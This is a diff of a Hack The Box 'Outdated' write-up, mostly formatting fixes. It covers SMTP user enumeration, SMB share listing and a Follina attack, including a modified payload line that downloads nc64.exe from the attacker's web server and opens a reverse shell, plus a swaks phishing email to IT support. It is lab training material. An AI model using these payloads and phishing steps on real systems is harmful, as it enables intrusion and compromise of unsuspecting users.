@@ -1,12 +1,12 @@
 ### DNS Enum
 We know about the domain name because the SMTP server discloses it  
-```
+```bash
 25/tcp   open  smtp          hMailServer smtpd
 | smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
 |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
 ```
 so we can probe the DNS server for more information  
-```
+```bash
 dig ANY @10.10.11.175 outdated.htb
 dig ANY @10.10.11.175 outdated.htb +short
 10.10.11.175
@@ -24,7 +24,7 @@ On a previos machine, (trick) I had written a very simple python script to enume
 And it worked by abusing the VRFY function.  
 This server here seems to be something called hMailServer smtpd if Nmap fingerprinting is correct.  
 As mentionned earyer the SMTP server, it discloses the domain name immediately on connectioni  
-```
+```bash
 telnet outdated.htb 25
 Trying 10.10.11.175...
 Connected to outdated.htb.
@@ -39,7 +39,7 @@ EHLO mail.outdated.htb
 
 Unfortunately though the VRFY command is disallowed,  
 So I won't be able to reuse the script I wrote from trick  
-```
+```bash
 HELP
 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
 VRFY asdf@asdf.org
@@ -48,7 +48,7 @@ VRFY asdf@asdf.org
 
 Looking for other options in Hacktricks, I decide to give a try to the RCPT enumeration method   
 and it looks like its gonna work  
-```
+```bash
 MAIL FROM: asdf@asdf.org
 250 OK
 RCPT TO:asdf@outdated.htb
@@ -130,10 +130,7 @@ if __name__ == "__main__":
             print(f"\r{green}Found one:{reset} {mail}")
     smtp.closeSock()
 ```
-I didn't find anyting more on this box, but I figured, it could still potentially be usefull in the future
-
-```
-I didn't find anyting more on this box, but I figured, it could still potentially be usefull in the future
+```bash
 python3 smtp_rcpt_brute.py words
 mail.outdated.htb ESMTP
 
@@ -143,13 +140,13 @@ I didn't find anyting more on this box, but I figured, it could still potentiall
   
 ## SMB enum
 back to actually trying to do something with the machine  
-```
+```bash
 nbtscan 10.10.11.168
 smbmap -H 10.10.11.175
 smbmap -H 10.10.11.175 -u null -p null
 smbmap -H 10.10.11.175 -u guest
 ```
-```
+```bash
 Disk                                                    Permissions     Comment
 ----                                                    -----------     -------
 ADMIN$                                                  NO ACCESS       Remote Admin
@@ -163,12 +160,12 @@ WsusContent                                             NO ACCESS       A networ
 WSUSTemp                                                NO ACCESS       A network share used by Local Publishing from a Remote WSUS Console Instance.
 ```
 We have access to "IPC$" and "Shares", IPC$ is apparently empty  
-```
+```bash
 smbclient -U guest -N //10.10.11.175/Shares
 smbclient --no-pass //10.10.11.175/Shares
 ```
 but there a pdf in Shares
-```
+```bash
 smb: \> ls
   .                                   D        0  Mon Jun 20 16:01:33 2022
   ..                                  D        0  Mon Jun 20 16:01:33 2022
@@ -185,13 +182,13 @@ From the pdf we get good indication that this is gonna be about sending a Follin
 Lord John Hammond did a thing, and it's really nice:
 [https://github.com/JohnHammond/msdt-follina](https://github.com/JohnHammond/msdt-follina)  
 with the simplest args this generates a follina payload, and serves it over http on port 8000  
-if we use the --reverse flag, it slaps a reverse shell payload into the follina ms-msdt thing 
-and even opens a netcat listener for us to catch the shell
+if we use the --reverse flag, it slaps a reverse shell payload into the follina ms-msdt thing  
+and even opens a netcat listener for us to catch the shell  
 the code John wrote is actually fetching nc64.exe from his own github  
-and uses that to call back from the victim's machine 
+and uses that to call back from the victim's machine  
 Of course this isn't gonna do the trick for us, since the victim doesn't have internet access  
 So lets change the code slightly to host nc64.exe on our machine on another webserver on 9191  
-```python3
+```python
 if args.reverse:
         command = f"""Invoke-WebRequest http://10.10.14.43:9191/nc64.exe -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
 
@@ -206,7 +203,7 @@ if args.reverse:
     )
 ```
 generating the payload and starting the webserver and listener all at once  
-```
+```bash
 ./follina.py -i tun0 -r 9090
 [+] copied staging doc /tmp/y9v6zrd8
 [+] created maldoc ./follina.doc
@@ -215,20 +212,20 @@ generating the payload and starting the webserver and listener all at once
 listening on [any] 9090 ...
 ```
 and starting the webserver on 9191 for netcat
-```
+```bash
 python3 -m http.server 9191                               2 ⨯
 Serving HTTP on 0.0.0.0 port 9191 (http://0.0.0.0:9191/) ...
 ```
 
 Double checking how the payload was generated
-```
+```bash
 curl -s http://10.10.14.43:8000|awk -F '+' '{print $9}'|tr -d "'"|base64 -d
 Invoke-WebRequest http://10.10.14.43:9191/nc64.exe -OutFile C:\Windows\Tasks\nc.exe; C:\Windows\Tasks\nc.exe -e cmd.exe 10.10.14.43 9090
 ```
 
 now the only thing left to do is to deliver the payload  
 We'll do that by sending a link to our local webserver hosting the follina payload over email to the itsupport team.
-```
+```bash
 swaks \
     --from asdf@asdf.htb \
     --to itsupport@outdated.htb \
@@ -236,11 +233,10 @@ swaks \
     --server mail.outdated.htb \
     --body 'http://10.10.14.43:8000'
 ```
+couldn't get a callback though, will try again some other day
 
 
-
-
-```
+```bash
 Domain Name: OUTDATED
 Domain Sid: S-1-5-21-4089647348-67660539-4016542185
 ```
